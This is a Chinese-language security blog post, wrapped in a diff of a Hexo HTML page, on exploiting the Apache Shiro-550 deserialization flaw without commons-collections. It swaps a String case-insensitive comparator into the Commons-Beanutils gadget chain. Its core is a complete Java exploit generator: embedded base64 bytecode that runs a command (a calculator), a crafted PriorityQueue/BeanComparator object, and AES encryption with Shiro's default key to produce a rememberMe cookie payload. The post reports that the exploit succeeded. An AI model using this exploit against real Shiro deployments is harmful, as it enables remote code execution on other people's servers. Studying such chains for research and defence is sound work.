@@ -1,0 +1,495 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/bg/6.png">
+  <link rel="icon" href="/img/bg/6.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="海马少年">
+  <meta name="keywords" content="">
+  <meta name="description" content="Shiro-550 反序列化链（二）在实际情况下 Shiro 可能没有安装 commons-collections 这个时候就不能利用CC链了，但是这里可以利用Commons-Beanutils链吗? 在 P神的 shirodemo 中，把pom.xml中的commons-collections删除，重新使用Maven加载时，发现依赖库中依然存在 Commons-Beanutils，那么shiro">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Shiro-550反序列化(二)">
+<meta property="og:url" content="http://example.com/2021/11/18/Shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/index.html">
+<meta property="og:site_name" content="Lcdm123">
+<meta property="og:description" content="Shiro-550 反序列化链（二）在实际情况下 Shiro 可能没有安装 commons-collections 这个时候就不能利用CC链了，但是这里可以利用Commons-Beanutils链吗? 在 P神的 shirodemo 中，把pom.xml中的commons-collections删除，重新使用Maven加载时，发现依赖库中依然存在 Commons-Beanutils，那么shiro">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211117230122473.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211117232538623.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211117233152969.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211117234506871.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211117235513616.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211118000823383.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211118000557586.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211118001128482.png">
+<meta property="article:published_time" content="2021-11-17T16:14:35.000Z">
+<meta property="article:modified_time" content="2021-11-17T16:14:57.559Z">
+<meta property="article:author" content="海马少年">
+<meta property="article:tag" content="代码审计">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="Java">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211117230122473.png">
+  
+  <title>Shiro-550反序列化(二) - Lcdm123</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.12","typing":{"enable":true,"typeSpeed":70,"cursorChar":"*","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname"}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="Lcdm123" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>海马少年</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/bg/6.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="Shiro-550反序列化(二)">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-11-18 00:14" pubdate>
+        2021年11月18日 凌晨
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      5.4k 字
+    </span>
+  
+
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      17 分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Shiro-550反序列化(二)</h1>
+            
+            <div class="markdown-body">
+              <h2 id="Shiro-550-反序列化链（二）"><a href="#Shiro-550-反序列化链（二）" class="headerlink" title="Shiro-550 反序列化链（二）"></a>Shiro-550 反序列化链（二）</h2><p>在实际情况下 Shiro 可能没有安装 commons-collections 这个时候就不能利用CC链了，但是这里可以利用Commons-Beanutils链吗?</p>
+<p>在 P神的 shirodemo 中，把pom.xml中的commons-collections删除，重新使用Maven加载时，发现依赖库中依然存在 Commons-Beanutils，那么shiro就是依赖Commons-Beanutils的</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211117230122473.png" srcset="/img/loading.gif" lazyload alt="image-20211117230122473"></p>
+<p>那么这里可以直接使用 CB1链子吗？</p>
+<p>但是这里显示报错了</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211117232538623.png" srcset="/img/loading.gif" lazyload alt="image-20211117232538623"></p>
+<p>根据报错判断和反序列化的<code>serialVersionUID</code>有关系，应该是两边的Commons-Beanutils版本不一样导致的。修改本地版本重新测试</p>
+<p>修改之后报错改变了</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211117233152969.png" srcset="/img/loading.gif" lazyload alt="image-20211117233152969"></p>
+<blockquote>
+<p>不能加载 org.apache.commons.collections.comparators.ComparableComparator 类</p>
+</blockquote>
+<p>在Commons-Beanutils中只依赖了一部分commons-collections 但是在shiro正常使用时不依赖于commons-collections，但反序列化利用的时候需要依赖于commons-collections。</p>
+<p>所以这里就需要找到代替的类</p>
+<h2 id="无依赖shiro反序列化链"><a href="#无依赖shiro反序列化链" class="headerlink" title="无依赖shiro反序列化链"></a>无依赖shiro反序列化链</h2><p>先寻找使用<code>org.apache.commons.collections.comparators.ComparableComparator</code>的地方</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211117234506871.png" srcset="/img/loading.gif" lazyload alt="image-20211117234506871"></p>
+<p>在<code>BeanComparator</code>的构造函数有两个地方使用了，但是只需要在构造函数中传入<code>compatator</code>参数就可以绕过了。但是我们需要重新找到一个类来替换<code>ComparableComparator</code>，并且需要满足的条件</p>
+<ul>
+<li>实现了<code>java.util.Comparator</code>接口</li>
+<li>实现了反序列化接口</li>
+<li>java shiro 或 commons-beanutils 自带的，并且兼容性强</li>
+</ul>
+<p>这里找到了一个完美的代替类<code>CaseInsensitiveComparator</code>，它是String类中的一个内部私有类</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211117235513616.png" srcset="/img/loading.gif" lazyload alt="image-20211117235513616"></p>
+<p>我们通过 <code>String.CASE_INSENSITIVE_ORDER</code> 即可拿到上下文中的 <code>CaseInsensitiveComparator</code> 对 象，用它来实例化 <code>BeanComparator</code></p>
+<p>所以这里重新修改链子</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.lcdm123;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><span class="hljs-keyword">import</span> org.apache.shiro.crypto.AesCipherService;<br><span class="hljs-keyword">import</span> org.apache.shiro.util.ByteSource;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><span class="hljs-keyword">import</span> java.lang.String;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ShiroV2</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException </span>&#123;<br>        <span class="hljs-keyword">byte</span>[] bytes = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQAMQcAIwoAAQAkCgAHACQKACUAJggAJwoAJQAoBwApAQAJdHJhbnNmb3JtAQByKExj&quot;</span> +<br>                <span class="hljs-string">&quot;b20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcv&quot;</span> +<br>                <span class="hljs-string">&quot;YXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAE&quot;</span> +<br>                <span class="hljs-string">&quot;Q29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAB9Mb3Jn&quot;</span> +<br>                <span class="hljs-string">&quot;L2xjZG0xMjMvVGVtcGxhdGVzSW1wbFRlc3Q7AQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBh&quot;</span> +<br>                <span class="hljs-string">&quot;Y2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcv&quot;</span> +<br>                <span class="hljs-string">&quot;YXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4&quot;</span> +<br>                <span class="hljs-string">&quot;Y2VwdGlvbnMHACoBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9E&quot;</span> +<br>                <span class="hljs-string">&quot;T007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtM&quot;</span> +<br>                <span class="hljs-string">&quot;Y29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25I&quot;</span> +<br>                <span class="hljs-string">&quot;YW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9k&quot;</span> +<br>                <span class="hljs-string">&quot;dG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9p&quot;</span> +<br>                <span class="hljs-string">&quot;bnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEABG1haW4BABYoW0xqYXZh&quot;</span> +<br>                <span class="hljs-string">&quot;L2xhbmcvU3RyaW5nOylWAQAEYXJncwEAE1tMamF2YS9sYW5nL1N0cmluZzsHACsBAAY8aW5pdD4B&quot;</span> +<br>                <span class="hljs-string">&quot;AAMoKVYBAApTb3VyY2VGaWxlAQAWVGVtcGxhdGVzSW1wbFRlc3QuamF2YQEAHW9yZy9sY2RtMTIz&quot;</span> +<br>                <span class="hljs-string">&quot;L1RlbXBsYXRlc0ltcGxUZXN0DAAfACAHACwMAC0ALgEAEGdub21lLWNhbGN1bGF0b3IMAC8AMAEA&quot;</span> +<br>                <span class="hljs-string">&quot;QGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0&quot;</span> +<br>                <span class="hljs-string">&quot;VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNs&quot;</span> +<br>                <span class="hljs-string">&quot;ZXRFeGNlcHRpb24BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApn&quot;</span> +<br>                <span class="hljs-string">&quot;ZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0&quot;</span> +<br>                <span class="hljs-string">&quot;cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAEABwAAAAAABAABAAgACQACAAoAAAA/AAAAAwAA&quot;</span> +<br>                <span class="hljs-string">&quot;AAGxAAAAAgALAAAABgABAAAADwAMAAAAIAADAAAAAQANAA4AAAAAAAEADwAQAAEAAAABABEAEgAC&quot;</span> +<br>                <span class="hljs-string">&quot;ABMAAAAEAAEAFAABAAgAFQACAAoAAABJAAAABAAAAAGxAAAAAgALAAAABgABAAAAFAAMAAAAKgAE&quot;</span> +<br>                <span class="hljs-string">&quot;AAAAAQANAA4AAAAAAAEADwAQAAEAAAABABYAFwACAAAAAQAYABkAAwATAAAABAABABQACQAaABsA&quot;</span> +<br>                <span class="hljs-string">&quot;AgAKAAAANwACAAEAAAAJuwABWbcAAlexAAAAAgALAAAACgACAAAAFwAIABgADAAAAAwAAQAAAAkA&quot;</span> +<br>                <span class="hljs-string">&quot;HAAdAAAAEwAAAAQAAQAeAAEAHwAgAAIACgAAAEAAAgABAAAADiq3AAO4AAQSBbYABlexAAAAAgAL&quot;</span> +<br>                <span class="hljs-string">&quot;AAAADgADAAAAGQAEABoADQAbAAwAAAAMAAEAAAAOAA0ADgAAABMAAAAEAAEAHgABACEAAAACACI=&quot;</span>);<br>        TemplatesImpl template =<span class="hljs-keyword">new</span> TemplatesImpl();<br>        setFieldValue(template,<span class="hljs-string">&quot;_bytecodes&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;bytes&#125;);<br>        setFieldValue(template,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;lcdm123&quot;</span>);<br><br><br>        <span class="hljs-keyword">final</span> BeanComparator comp = <span class="hljs-keyword">new</span> BeanComparator(<span class="hljs-keyword">null</span>,String.CASE_INSENSITIVE_ORDER);<br>        PriorityQueue queue = <span class="hljs-keyword">new</span> PriorityQueue(<span class="hljs-number">3</span>,comp);<br>        queue.add(<span class="hljs-string">&quot;1&quot;</span>);<br>        queue.add(<span class="hljs-string">&quot;1&quot;</span>);<br>        setFieldValue(comp,<span class="hljs-string">&quot;property&quot;</span>,<span class="hljs-string">&quot;outputProperties&quot;</span>);<br>        setFieldValue(queue, <span class="hljs-string">&quot;queue&quot;</span>, <span class="hljs-keyword">new</span> Object[]&#123;template, template&#125;);<br>        ByteArrayOutputStream byteArrayOutputStream = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream objectOutputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(byteArrayOutputStream);<br>        objectOutputStream.writeObject(queue);<br>        objectOutputStream.close();<br><br>        <span class="hljs-keyword">byte</span>[] payload = byteArrayOutputStream.toByteArray();<br>        <span class="hljs-keyword">byte</span>[] key = Base64.getDecoder().decode(<span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);<br>        AesCipherService aes = <span class="hljs-keyword">new</span> AesCipherService();<br>        ByteSource byteSource = aes.encrypt(payload,key);<br>        System.out.println(byteSource.toString());<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException </span>&#123;<br>        Class clazz = obj.getClass();<br>        Field field = clazz.getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-keyword">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>成功执行了命令</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211118000823383.png" srcset="/img/loading.gif" lazyload alt="image-20211118000823383"></p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211118000557586.png" srcset="/img/loading.gif" lazyload alt="image-20211118000557586"></p>
+<p>虽然感觉变化的不多，但是这里利用的东西却不少，发现还有一些其他的代替方法</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211118001128482.png" srcset="/img/loading.gif" lazyload alt="image-20211118001128482"></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/Web/">Web</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
+                    
+                      <a class="hover-with-bg" href="/tags/Web/">Web</a>
+                    
+                      <a class="hover-with-bg" href="/tags/Java/">Java</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/11/18/%E6%B7%B1%E8%82%B2%E6%9D%AFWeblog%E5%A4%8D%E7%8E%B0/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">深育杯Weblog复现</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/11/17/Java-CommonsBeanutils1/">
+                        <span class="hidden-mobile">Java CommonsBeanutils1</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  
+    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
+  
+  
+    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
+  
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
